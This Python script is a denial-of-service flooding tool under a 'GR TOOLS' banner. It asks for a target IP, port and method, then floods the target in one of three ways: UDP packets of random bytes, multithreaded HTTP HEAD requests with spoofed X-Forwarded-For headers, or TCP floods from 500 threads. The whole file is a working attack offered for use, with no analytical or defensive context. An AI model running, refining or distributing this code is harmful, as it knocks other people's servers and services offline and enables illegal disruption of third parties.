import os

import time

import threading

import socket

import random

import ctypes

import datetime

import sys

tampilan = """

░██████╗░██████╗   ░████████╗░█████╗░░█████╗░██╗░░░░░░██████╗

██╔════╝░██╔══██╗   ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██╔════╝

██║░░██╗░██████╔╝   ░░░██║░░░██║░░██║██║░░██║██║░░░░░╚█████╗░

██║░░╚██╗██╔══██╗   ░░░██║░░░██║░░██║██║░░██║██║░░░░░░╚═══██╗

╚██████╔╝██║░░██║   ░░░██║░░░╚█████╔╝╚█████╔╝███████╗██████╔╝

░╚═════╝░╚═╝░░╚═╝   ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═════╝░

"""

print(tampilan)

ip = str(input("~GRC2@root Enter Target IP : "))

ip = socket.gethostbyname(ip)

port = int(input("~GRC2@root Enter Target PORT : "))

times = int(input("~GRC2@root Enter TIME : "))

method = str(input("~GRC2@root Enter METHOD :"))

os.system("clear")

run = int(input("~GRC2@root Runner(Only Layer7) : "))

expiration_date = datetime.datetime.now() + datetime.timedelta(days=1)

if method == "udpflood":

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    s.connect((ip, port))

    def udpby():

        udpfloodl = random._urandom(10024)

        while datetime.datetime.now() < expiration_date:

            try:

                s.sendto(udpfloodl, (ip, port))

                for x in range(times):

                    s.sendto(udpfloodl, (ip, port))

                print(f"Sending Packet to > ip : {ip} port : {port} | with time => {times} with Method UDP Flood ")

            except socket.error:

                print(f"Error Cant Connecting | ip : {ip} port : {port}")

                s.close()

    udpby()

if method == "layer7":

    url = "https://" + str(ip)

    def randomip():

        randip = []

        randip1 = random.randint(1,255)

        randip2 = random.randint(1,255)

        randip3 = random.randint(1,255)

        randip4 = random.randint(1,255)

        randip.append(randip1)

        randip.append(randip2)

        randip.append(randip3)

        randip.append(randip4)

        randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])

        return(randip)

    print('[</>] Start Attacking {} [</>]'.format(ip))

    time.sleep(1)

    def startAttack():

        connection = "Connection: null\r\n"

        referer = "Referer: null\r\n"

        forward = "X-Forwarded-For: " + randomip() + "\r\n"

        get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"

        request = get_host + referer  + connection + forward + "\r\n\r\n"

        while True:

            try:

                atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                atk.connect((ip, port))

                for y in range(times): # Start attack

                    atk.send(str.encode(request))

            except socket.error:

                time.sleep(.1)

            except:

                pass

    if __name__ == "__main__":

        for i in range(run):

            th = threading.Thread(target=startAttack).start()

if method == "tcpflood":

    def tcpfl():

        grtools = random._urandom(20219)

        while datetime.datetime.now() < expiration_date:

            try:

                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

                sock.connect((ip, port))

                sock.send(grtools)

                for x in range(times):

                    sock.send(grtools)

                print(f"Sending Packet to > ip : {ip} port : {port} | with time => {times} with Method TCP Flood ")

            except socket.error:

                print(f"Error Cant Connecting | ip : {ip} port : {port}")

                sock.close()

    for x in range(500):

        t = threading.Thread(target=tcpfl)

        t.start()
